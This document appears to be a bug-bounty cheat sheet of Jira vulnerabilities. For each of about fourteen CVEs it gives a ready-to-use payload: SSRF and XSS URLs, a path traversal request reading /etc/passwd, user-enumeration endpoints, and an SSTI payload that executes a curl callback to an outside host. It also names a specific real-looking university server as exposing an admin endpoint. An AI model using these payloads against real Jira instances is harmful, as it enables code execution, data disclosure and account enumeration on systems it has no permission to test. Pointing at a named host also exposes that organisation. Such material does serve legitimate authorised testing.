# JIRA-Vulnerabilities

Index | Technique
--- | ---
**1** | CVE-2017-9506 (SSRF)
**2** | CVE-2018-5230 (XSS)
**3** | CVE-2018-20824 (XSS)
**4** | CVE-2019-3396 (Path Traversal)
**5** | CVE-2019-3402 (XSS)
**6** | CVE-2019-3403 (User Enumeration)
**7** | CVE-2019-8442 (Sensitive Information Disclosure)
**8** | CVE-2019-8449 (User Information Disclosure)
**9** | CVE-2019-8451 (SSRF)
**10** | CVE-2019-11581 (SSTI)
**11** | CVE-2020-14178 (Project Key Enumeration)
**12** | CVE-2020-14179 (Sensitive Information Disclosure)
**13** | CVE-2020-14181 (User Enumeration)
**14** | CVE-2020-36289 (Username Enumeration)
**15** | Tools
**16**| Reports

___
#### CVE-2017-9506 (SSRF)
```
Navigate to <JIRA_URL>/plugins/servlet/oauth/users/icon-uri?consumerUri=http://bing(.)com
```

##### CVE-2018-5230 (XSS)
```
http://<JIRA>/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E.vm
```
#### CVE-2018-20824 (XSS)
```
Navigate to <JIRA_URL>/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)
```

#### CVE-2019-3396 (Path Traversal)
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: JIRA
...

{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler(.)com/v/23464dc5","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}
```


#### CVE-2019-3402 (XSS)
```
Navigate to <JIRA_URL>/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=%3Cscript%3Ealert(1)%3C/script%3E&Search=Search
```

#### CVE-2019-3403 (User Enumeration)
```
Navigate to <Jira_URL>/rest/api/2/user/picker?query=<user_name_here> 
```

#### CVE-2019-8442 (Sensitive Information Disclosure)
```
Navigate to <JIRA_URL>/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml
```

#### CVE-2019-8449 (User Information Disclosure)
```
Navigate to <JIRA_URL>/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
```

#### CVE-2019-8451 (SSRF)
```
Navigate to <JIRA_URL>/plugins/servlet/gadgets/makeRequest?url=https://<host_name>:1337@example.com
```

#### CVE-2019-11581 (SSTI)

```
a. Navigate to <JIRA_URL>/secure/ContactAdministrators!default.jspa
b. Try SSTI payload in subject and/or body:
$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://xyz.burp(.)net').waitFor()
```
#### CVE-2020-14178 (Project Key Enumeration)

```
a. Navigate to <JIRA_URL>/browse.<project_key>
b. Observe the error message on valid vs. invalid project key. Apart from the Enumeration, you can often get unauthenticated access to the project if the protections are not in place.

```
#### CVE-2020-14179 (Sensitive Information Disclosure)
```
Navigate to <JIRA_URL>/secure/QueryComponent!Default.jspa
```

#### CVE-2020-14181 (User Enumeration)

```
Navigate to <JIRA_URL>/secure/ViewUserHover.jspa?username=<uname>
```
#### CVE-2020-36289 (Username Enumeration)
```
Navigate to <JIRA_URL>/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
```
```
 For target.atlassian(.)net, check this endpoints: 
/servicedesk/customer/user/signup [Able to login? Vuln:)]
/jira/projects [Can see projects? Vuln:) Now click on sign in and use OAuth]
```

```
jira-unauth-popular-filters:
https://<JIRA>/secure/ManageFilters.jspa?filterView=popular
```

```
jira-unauthenticated-dashboards:
https://<JIRA>/rest/api/2/dashboard?maxResults=100
```

```
Resolution found
/rest/api/2/resolution
```

```

Admin Project Dashboard Accessible
https://mtihelpdesk.eng.monash.edu/rest/menu/latest/admin















#### Tools

[Nuclei Template](https://github.com/projectdiscovery/nuclei-templates/blob/master/workflows/jira-workflow.yaml) can be used to automate most of these CVEs Detection.
[Automation Script](https://github.com/MayankPandey01/Jira-Lens) 

#### Reports
* [https://hackerone.com/reports/632808](https://hackerone.com/reports/632808)
* [https://hackerone.com/reports/1003980](https://hackerone.com/reports/1003980)
* https://hackerone.com/reports/713900
* https://hackerone.com/reports/139970
* https://hackerone.com/reports/197726
#### Blog
[How i converted SSRF TO XSS in jira.](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
